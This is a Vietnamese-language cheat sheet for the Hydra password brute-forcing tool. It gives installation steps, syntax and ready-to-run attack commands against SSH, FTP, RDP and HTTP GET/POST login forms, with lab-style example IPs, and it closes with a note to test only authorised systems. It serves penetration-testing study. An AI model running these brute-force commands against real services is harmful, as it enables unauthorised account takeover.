
## install

```bash
sudo apt update
sudo apt install hydra
```

## Cú pháp cơ bản

```bash
hydra -l/-L user/user.lst -p/-P pass/pass.lst -s <port> <IP/DNS> <service>
```

- `-l` → 1 username
    
- `-L` → danh sách username
    
- `-p` → 1 password
    
- `-P` → danh sách password
    
- `-s` → chỉ định port
    
- `<IP/DNS>` → mục tiêu
    
- `<service>` → dịch vụ cần brute-force
    

---

## Tấn công SSH

```bash
hydra -l <user> -P <pass.lst> <IP> ssh
```

Chỉ định port:

```bash
hydra -l <user> -P <pass.lst> -s <port> <IP> ssh
```

Ví dụ:

```bash
hydra -l root -P passwords.txt 10.10.10.10 ssh
```

---

## Tấn công FTP

```bash
hydra -l <user> -P <pass.lst> <IP> ftp
```

Chỉ định port:

```bash
hydra -l <user> -P <pass.lst> -s <port> <IP> ftp
```

Ví dụ:

```bash
hydra -L users.txt -P passwords.txt 10.10.10.10 ftp
```

---

## Tấn công RDP

```bash
hydra -l <user> -P <pass.lst> rdp://<IP>
```

Hoặc chỉ định port:

```bash
hydra -l <user> -P <pass.lst> -s <port> <IP> rdp
```

Ví dụ:

```bash
hydra -L users.txt -P passwords.txt -s 3389 10.10.10.10 rdp
```

---

## Tấn công HTTP POST Form

Cú pháp:

```bash
hydra -l <user> -P <pass.lst> <IP> http-post-form \
"/<login-path>:<POST-data>:<failure-condition>"
```

Ví dụ:

```bash
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form \
"/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

Trong đó:

- `http-post-form` → brute-force form đăng nhập bằng HTTP POST
    
- `/login.php` → đường dẫn login
    
- `^USER^` → Hydra thay bằng username
    
- `^PASS^` → Hydra thay bằng password
    
- `Invalid credentials` → chuỗi cho biết **đăng nhập thất bại**
    

> Với HTTP form, phải tự xác định **URL, tên parameter và failure/success condition** từ request thực tế, thường bằng Burp Suite.

---

## Tấn công HTTP GET Form

```bash
hydra -l <user> -P <pass.lst> <IP> http-get-form \
"/<login-path>:<GET-parameters>:<failure-condition>"
```

Ví dụ:

```bash
hydra -l admin -P passwords.txt 10.10.10.10 http-get-form \
"/login.php?username=^USER^&password=^PASS^:Invalid credentials"
```

- `http-get-form` → brute-force form sử dụng HTTP GET
    
- `^USER^` → username
    
- `^PASS^` → password
    
- `failure-condition` → dấu hiệu request thất bại
    

---

## Quy trình nhớ nhanh

```text
SSH / FTP / RDP
      ↓
chọn service
      ↓
Hydra tự xử lý authentication
```

```text
HTTP
  ↓
xác định GET/POST
  ↓
xác định login path
  ↓
xác định parameter
  ↓
xác định failure/success condition
  ↓
viết http-{get,post}-form
```

**Lưu ý:** chỉ sử dụng Hydra để kiểm thử các hệ thống mà bạn được phép kiểm thử.